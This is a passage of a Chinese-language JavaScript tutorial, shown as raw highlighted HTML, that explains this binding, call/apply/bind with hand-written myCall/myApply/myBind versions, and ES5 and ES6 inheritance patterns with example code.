<span class="title function_">sing</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="string">&#x27;use strict&#x27;</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">fans.<span class="title function_">sing</span>() <span class="comment">// fans对象</span></span><br></pre></td></tr></table></figure><h2 id="改变-this-的值"><a href="#改变-this-的值" class="headerlink" title="改变 this 的值"></a>改变 this 的值</h2><p>指定 this 的方法有两类</p><ol><li>调用函数传入具体的 this：<ol><li><code>call(参数1, 其他参数)</code><ol><li>参数1：this 值</li><li>其他参数：传递给函数的其他参数，可以有很多个</li></ol></li><li><code>apply(参数1, [参数2])</code><ol><li>参数1：this 值</li><li>参数2：以数组形式给函数传递参数</li></ol></li></ol></li><li>创建绑定 this 的函数：<ol><li>bind()<ol><li>和 call 类似，但是不执行函数</li><li>会返回一个绑定了 this 值的新函数</li></ol></li><li>箭头函数：最近的 this 值是哪个，就是哪个</li></ol></li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">func</span>(<span class="params">p1, p2</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(p1, p2)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> person = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;Alien&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// call调用函数</span></span><br><span class="line">func.<span class="title function_">call</span>(person, <span class="number">1</span>, <span class="number">2</span>) <span class="comment">// 打印person对象， 1， 2</span></span><br><span class="line"><span class="comment">// apply调用函数</span></span><br><span class="line">func.<span class="title function_">apply</span>(person, [<span class="number">3</span>, <span class="number">4</span>]) <span class="comment">// 打印person对象， 3， 4</span></span><br><span class="line"><span class="comment">// 创建绑定this的函数 bind</span></span><br><span class="line"><span class="keyword">const</span> bindFunc = func.<span class="title function_">bind</span>(person, <span class="number">123</span>) <span class="comment">// 不会直接执行，而是创建新函数</span></span><br><span class="line"><span class="title function_">bindFunc</span>(<span class="number">456</span>) <span class="comment">// 打印person对象， 123， 456   上面已经传入一个参数，这个函数会跟在后面继续传递</span></span><br><span class="line"><span class="comment">// 箭头函数</span></span><br><span class="line"><span class="keyword">const</span> student = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;ikun&#x27;</span>,</span><br><span class="line">    <span class="attr">sayThis</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="attr">sayThat</span>: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">student.<span class="title function_">sayThis</span>() <span class="comment">// 打印student对象，对象方法，谁调用指向谁</span></span><br><span class="line">student.<span class="title function_">sayThat</span>() <span class="comment">// 打印window对象，箭头函数，最近的this指向谁，它就指向谁</span></span><br></pre></td></tr></table></figure><h2 id="重写-call-方法"><a href="#重写-call-方法" class="headerlink" title="重写 call() 方法"></a>重写 call() 方法</h2><p>实现了一个自定义的 <code>myCall</code> 方法，能够在任意函数上调用，并且可以指定函数内部 <code>this</code> 的指向。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在function的原型上创建myCall方法，保证所有函数都可以调用</span></span><br><span class="line"><span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">myCall</span> = <span class="keyword">function</span>(<span class="params">thisArg, ...args</span>) &#123; <span class="comment">// 用剩余函数接受剩余的参数</span></span><br><span class="line">    <span class="keyword">const</span> f = <span class="title class_">Symbol</span>()  <span class="comment">// 使用 Symbol 作为属性名可以确保在对象上不会与对象原有的属性冲突</span></span><br><span class="line">    thisArg[f] = <span class="variable language_">this</span>  <span class="comment">// 按照谁调用就指定谁的原则</span></span><br><span class="line">    <span class="keyword">const</span> res = thisArg[f](...args)    <span class="comment">// 调用添加的函数，并用展开运算符传入参数</span></span><br><span class="line">    <span class="keyword">delete</span> thisArg[f]  <span class="comment">// 把新建的方法从对象中删除</span></span><br><span class="line">    <span class="keyword">return</span> res  <span class="comment">// 返回参数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> person = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;Alien&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">func</span>(<span class="params">num1, num2</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(num1, num2)</span><br><span class="line">    <span class="keyword">return</span> num1 + num2</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> res = func.<span class="title function_">myCall</span>(person, <span class="number">5</span>, <span class="number">7</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br></pre></td></tr></table></figure><ul><li>在<code>Function</code>的<a href="https://m78alien.github.io/2024/03/11/JavaScript-%E6%B7%B1%E5%85%A5%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/#%E5%8E%9F%E5%9E%8B%E5%AF%B9%E8%B1%A1">原型对象</a>上添加 <code>myCall()</code> 方法，保证所有函数都可以调用</li><li>方法内部通过动态为对象添加方法来指定 this 的指向</li><li>调用完毕后再删除 <code>delete()</code> 方法</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Symbol">Symbol函数</a>的目的是避免重名导致的错误，每次 symbol 的返回值都是唯一的</li><li><code>thisArg[f]</code> 使用了 Symbol 作为属性名，正常情况下不会影响原函数或覆盖，而 <code>thisArg.f</code> 直接使用了字符串作为属性名，遇到同名方法可能会覆盖</li></ul><h2 id="重写-apply-方法"><a href="#重写-apply-方法" class="headerlink" title="重写 apply() 方法"></a>重写 apply() 方法</h2><p>实现自定义函数 myApply() ，与 myCall 方法类似</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在function的原型上创建myApply方法，保证所有函数都可以调用</span></span><br><span class="line"><span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">myApply</span> = <span class="keyword">function</span> (<span class="params">thisArg, args</span>) &#123; <span class="comment">// 用剩余函数接受剩余的参数</span></span><br><span class="line">    <span class="keyword">const</span> f = <span class="title class_">Symbol</span>()</span><br><span class="line">    thisArg[f] = <span class="variable language_">this</span>  <span class="comment">// 按照谁调用就指定谁的原则</span></span><br><span class="line">    <span class="keyword">const</span> res = thisArg[f](...args)    <span class="comment">// 调用添加的函数，并用展开运算符传入参数</span></span><br><span class="line">    <span class="keyword">delete</span> thisArg[f]  <span class="comment">// 把新建的方法从对象中删除</span></span><br><span class="line">    <span class="keyword">return</span> res  <span class="comment">// 返回参数</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> person = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;Alien&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">func</span>(<span class="params">num1, num2</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(num1, num2)</span><br><span class="line">    <span class="keyword">return</span> num1 + num2</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> res = func.<span class="title function_">myApply</span>(person, [<span class="number">5</span>, <span class="number">7</span>])</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br></pre></td></tr></table></figure><ul><li>与 <code>myCall()</code> 的写法一致，只需要将传进来的参数定为数组即可</li></ul><h2 id="重写-bind-方法"><a href="#重写-bind-方法" class="headerlink" title="重写 bind() 方法"></a>重写 bind() 方法</h2><p>实现自定义函数 <code>myBind()</code> ，需要实现新函数参数的拼接</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在function的原型上创建myBind方法，保证所有函数都可以调用</span></span><br><span class="line"><span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">myBind</span> = <span class="keyword">function</span> (<span class="params">thisArg, ...args</span>) &#123; <span class="comment">// 用剩余函数接受剩余的参数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="function">(<span class="params">...args2</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// thisArg 需要指定的this</span></span><br><span class="line">        <span class="comment">// args 调用myBind时传入的参数</span></span><br><span class="line">        <span class="comment">// args2 调用新函数时传入的参数</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">myCall</span>(thisArg, ...args, ...args2)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> person = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;Alien&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">func</span>(<span class="params">num1, num2, num3, num4</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(num1, num2, num3, num4)</span><br><span class="line">    <span class="keyword">return</span> num1 + num2 + num3 + num4</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> newBind = func.<span class="title function_">myBind</span>(person, <span class="number">5</span>, <span class="number">7</span>)</span><br><span class="line"><span class="keyword">const</span> res = <span class="title function_">newBind</span>(<span class="number">1</span>, <span class="number">4</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br></pre></td></tr></table></figure><ol><li><code>function</code>原型上添加<code>myBind</code>函数，参数1为绑定的this，参数2为绑定的参数</li><li>内部返回一个新箭头函数，目的是绑定作用域中的this</li><li>返回的函数内部，通过<code>call</code>进行this和参数绑定</li><li>通过<code>call</code>的参数2和参数3指定绑定的参数，和调用时传递的参数</li></ol><h1 id="JS-继承"><a href="#JS-继承" class="headerlink" title="JS 继承"></a>JS 继承</h1><h2 id="ES5-原型链继承"><a href="#ES5-原型链继承" class="headerlink" title="ES5-原型链继承"></a>ES5-原型链继承</h2><ol><li>将父类的实例作为子类的原型实现继承</li><li>这种继承方法的缺点是父类中的引用类型数据会被所有子类共享</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 父类</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Parent</span>(<span class="params">name</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">foods</span> = [<span class="string">&#x27;西蓝花&#x27;</span>, <span class="string">&#x27;西红柿&#x27;</span>]</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">sayFoods</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">foods</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 子类</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Son</span>(<span class="params"></span>) &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 将父类的实例 作为子类的原型</span></span><br><span class="line"><span class="title class_">Son</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title class_">Parent</span>(<span class="string">&#x27;jack&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> s1 = <span class="keyword">new</span> <span class="title class_">Son</span>()</span><br><span class="line">s1.<span class="title function_">sayFoods</span>()<span class="comment">// [&#x27;西蓝花&#x27;, &#x27;西红柿&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> s2 = <span class="keyword">new</span> <span class="title class_">Son</span>()</span><br><span class="line">s2.<span class="title function_">sayFoods</span>() <span class="comment">// [&#x27;西蓝花&#x27;, &#x27;西红柿&#x27;]</span></span><br><span class="line"></span><br><span class="line">s2.<span class="property">foods</span>.<span class="title function_">push</span>(<span class="string">&#x27;西葫芦&#x27;</span>)</span><br><span class="line"></span><br><span class="line">s2.<span class="title function_">sayFoods</span>()<span class="comment">// [&#x27;西蓝花&#x27;, &#x27;西红柿&#x27;, &#x27;西葫芦&#x27;]</span></span><br><span class="line">s1.<span class="title function_">sayFoods</span>()<span class="comment">// [&#x27;西蓝花&#x27;, &#x27;西红柿&#x27;, &#x27;西葫芦&#x27;]</span></span><br></pre></td></tr></table></figure><h2 id="ES5-构造函数继承"><a href="#ES5-构造函数继承" class="headerlink" title="ES5-构造函数继承"></a>ES5-构造函数继承</h2><ol><li>在子类的构造函数中通过<code>call</code>或者<code>apply</code>调用父类的构造函数</li><li>这种继承方法的缺点是：子类没法使用父类原型上的属性&#x2F;方法</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 父类</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Parent</span>(<span class="params">name</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Parent</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">sayHi</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;你好,我叫:&#x27;</span>, <span class="variable language_">this</span>.<span class="property">name</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 子类</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Son</span>(<span class="params">name</span>) &#123;</span><br><span class="line">    <span class="title class_">Parent</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>, name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> s1 = <span class="keyword">new</span> <span class="title class_">Son</span>(<span class="string">&#x27;lucy&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> s2 = <span class="keyword">new</span> <span class="title class_">Son</span>(<span class="string">&#x27;rose&#x27;</span>)</span><br><span class="line">s1.<span class="title function_">sayHi</span>() <span class="comment">// 报错</span></span><br></pre></td></tr></table></figure><h2 id="ES5-组合继承"><a href="#ES5-组合继承" class="headerlink" title="ES5-组合继承"></a>ES5-组合继承</h2><ol><li>组合继承的核心步骤有2步：<ol><li>通过原型链继承公共的属性和方法</li><li>通过构造函数继承实例独有的属性和方法</li></ol></li><li>组合继承的特点：调用2次父类的构造函数，浪费性能</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 父类</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params">name</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 方法加父类原型上</span></span><br><span class="line"><span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">sayHi</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`你好，我叫<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span>`</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 子类构造函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Student</span>(<span class="params">name, age</span>) &#123;</span><br><span class="line">    <span class="comment">// 调用父类构造函数传入this</span></span><br><span class="line">    <span class="title class_">Person</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>, name)</span><br><span class="line">    <span class="comment">// 子类独有的属性和方法单独设置</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">age</span> = age</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 设置子类的原型为 父类实例</span></span><br><span class="line"><span class="title class_">Student</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title class_">Person</span>()</span><br><span class="line"><span class="comment">// 调用子类的构造函数</span></span><br><span class="line"><span class="keyword">const</span> s = <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&#x27;李雷&#x27;</span>, <span class="number">18</span>)</span><br><span class="line"><span class="comment">// 可以使用原型链上的 属性和方法 也可以使用 通过构造函数获取的父类的属性和方法</span></span><br></pre></td></tr></table></figure><h2 id="ES5-原型式继承"><a href="#ES5-原型式继承" class="headerlink" title="ES5-原型式继承"></a>ES5-原型式继承</h2><ol><li>原型式继承的核心步骤是：对某个对象进行浅拷贝，可以通过内置<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/create">api</a><code>Object.create()</code>实现，不需要调用构造函数即可实现继承，主要针对于继承对象的情况</li><li>原型式继承的缺点是：父类中的引用数据类型，会被所有子类共享</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> parent = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;parent&#x27;</span>,</span><br><span class="line">    <span class="attr">age</span>: <span class="number">25</span>,</span><br><span class="line">    <span class="attr">friend</span>: [<span class="string">&#x27;rose&#x27;</span>, <span class="string">&#x27;ice&#x27;</span>, <span class="string">&#x27;robot&#x27;</span>],</span><br><span class="line">    <span class="title function_">sayHi</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">name</span>, <span class="variable language_">this</span>.<span class="property">age</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> son1 = <span class="title class_">Object</span>.<span class="title function_">create</span>(parent)</span><br><span class="line"><span class="keyword">const</span> son2 = <span class="title class_">Object</span>.<span class="title function_">create</span>(parent)</span><br><span class="line">son1.<span class="property">friend</span>.<span class="title function_">push</span>(<span class="string">&#x27;lucy&#x27;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(son2.<span class="property">friend</span>)</span><br></pre></td></tr></table></figure><h2 id="ES5-寄生式继承"><a href="#ES5-寄生式继承" class="headerlink" title="ES5-寄生式继承"></a>ES5-寄生式继承</h2><ol><li>寄生式继承的核心步骤是：基于对象创建新对象（可以使用<code>Object.create</code>），并且为新创建的对象增加新的属性和方法</li><li>寄生式继承和上一节学习的原型式继承的区别是:创建出来的新对象,会额外的增加新的<strong>属性&#x2F;方法</strong></li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">createAnother</span>(<span class="params">origin</span>) &#123;</span><br><span class="line">    <span class="comment">// Object.create基于原型创建新对象，对属性进行浅拷贝</span></span><br><span class="line">    <span class="keyword">const</span> clone = <span class="title class_">Object</span>.<span class="title function_">create</span>(origin)</span><br><span class="line">    <span class="comment">// 为对象增加属性/方法</span></span><br><span class="line">    clone.<span class="property">sayHi</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;你好&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> clone</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> parent = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;parent&#x27;</span>,</span><br><span class="line">    <span class="attr">foods</span>: [<span class="string">&#x27;西蓝花&#x27;</span>, <span class="string">&#x27;炒蛋&#x27;</span>, <span class="string">&#x27;花菜&#x27;</span>]</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> son1 = <span class="title function_">createAnother</span>(parent)</span><br><span class="line"><span class="keyword">const</span> son2 = <span class="title function_">createAnother</span>(parent)</span><br></pre></td></tr></table></figure><h2 id="ES5-寄生组合式继承"><a href="#ES5-寄生组合式继承" class="headerlink" title="ES5-寄生组合式继承"></a>ES5-寄生组合式继承</h2><ol><li>寄生组合式继承的核心步骤是：通过构造函数来继承属性，通过原型链来继承方法</li><li>寄生组合式继承和组合式继承的区别是：原型链的继承并没有调用父类的构造函数，而是直接基于父类的原型创建一个新副本实现继承</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 继承原型函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">inheritPrototype</span>(<span class="params">son, parent</span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> prototype = <span class="title class_">Object</span>.<span class="title function_">create</span>(parent.<span class="property"><span class="keyword">prototype</span></span>, &#123;</span><br><span class="line">        <span class="attr">constructor</span>: &#123;</span><br><span class="line">            <span class="attr">value</span>: son</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    son.<span class="property"><span class="keyword">prototype</span></span> = prototype</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 父类</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Parent</span>(<span class="params">name</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">foods</span> = [<span class="string">&#x27;西蓝花&#x27;</span>, <span class="string">&#x27;西葫芦&#x27;</span>, <span class="string">&#x27;西红柿&#x27;</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Parent</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">sayHi</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">name</span>, <span class="string">`我喜欢吃,<span class="subst">$&#123;<span class="variable language_">this</span>.foods&#125;</span>`</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 子类借用父类的构造函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Son</span>(<span class="params">name, age</span>) &#123;</span><br><span class="line">    <span class="title class_">Parent</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>, name)</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">age</span> = age</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 完成原型继承</span></span><br><span class="line"><span class="title function_">inheritPrototype</span>(<span class="title class_">Son</span>,<span class="title class_">Parent</span>)</span><br><span class="line"><span class="comment">// 可以继续在原型上添加属性/方法</span></span><br><span class="line"><span class="title class_">Son</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">sayAge</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;我的年龄是&#x27;</span>, <span class="variable language_">this</span>.<span class="property">age</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> son1 = <span class="keyword">new</span> <span class="title class_">Son</span>(<span class="string">&#x27;jack&#x27;</span>, <span class="number">18</span>)</span><br><span class="line"><span class="keyword">const</span> son2 = <span class="keyword">new</span> <span class="title class_">Son</span>(<span class="string">&#x27;rose&#x27;</span>, <span class="number">16</span>)</span><br></pre></td></tr></table></figure><h2 id="ES6-class实现继承"><a href="#ES6-class实现继承" class="headerlink" title="ES6-class实现继承"></a>ES6-class实现继承</h2><p><strong>class 核心语法:</strong></p><ol><li>如何定义及使用类：</li><li>如何定义实例属性&#x2F;方法：</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="comment">// 实例属性，方便一眼确认有哪些</span></span><br><span class="line">    name</span><br><span class="line">    food</span><br><span class="line">    <span class="comment">// 构造方法，类似于构造函数，new的时候会调用，内部的this就是实例化的对象</span></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">name, food</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span 